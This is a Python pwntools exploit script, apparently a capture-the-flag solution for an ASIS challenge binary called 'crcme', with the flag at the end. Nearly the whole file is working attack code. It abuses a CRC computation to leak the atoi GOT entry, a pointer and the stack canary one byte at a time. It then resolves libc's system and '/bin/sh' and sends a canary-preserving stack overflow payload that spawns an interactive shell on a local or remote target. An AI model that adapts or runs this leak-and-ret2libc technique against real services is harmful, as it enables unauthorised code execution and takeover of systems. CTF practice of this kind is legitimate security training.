from pwn import *
from ctypes import *
from binascii import *
from struct import *
DEBUG = 1
if DEBUG:
     p = process('./crcme')
     #context.log_level = 'debug'
else:
     p = remote('69.90.132.40', 4000)

atoi_got=0x8049ffc
len_bss=0x804A040

def brute(addr, size):
    result=''
    for i in range(0,size):
        ad=addr+i
        p.recvuntil('Choice: ')
        p.sendline('1')
        p.recvuntil('data: ')
        p.sendline('1')
        p.recvuntil('process: ')
        p.sendline('a'*0x64+p32(ad))
        p.recvuntil('is: ')
        data=p.recv(10)
        crc=int(data,16)
        print data,hex(crc)
        for j in range(0,256):
            if u32(pack('i',crc32(chr(j))))==crc:
                result+=chr(j)
    return result
        
def pwn():
    #gdb.attach(p,'b *0x8048600')
    atoi_addr=u32(brute(atoi_got,4))
    len_addr=u32(brute(len_bss,4))
    canary=brute(len_addr+0x6c,4)

    print hex(atoi_addr),hex(len_addr),hex(u32(canary))
    libc=ELF("/lib32/libc-2.24.so")
    libc_base = atoi_addr - libc.symbols['atoi']
    system_addr = libc_base + libc.symbols['system']
    bin_sh_addr= libc_base +next(libc.search('/bin/sh'))

    p.recvuntil('Choice: ')
    payload='a'*0x28+canary+'a'*12+p32(system_addr)+'a'*4+p32(bin_sh_addr)
    p.sendline(payload)
  
    p.interactive()

if __name__ == '__main__':
   pwn()

##ASIS{e77c4a76d8079b330e7e78e8e3f434c4}

 
    

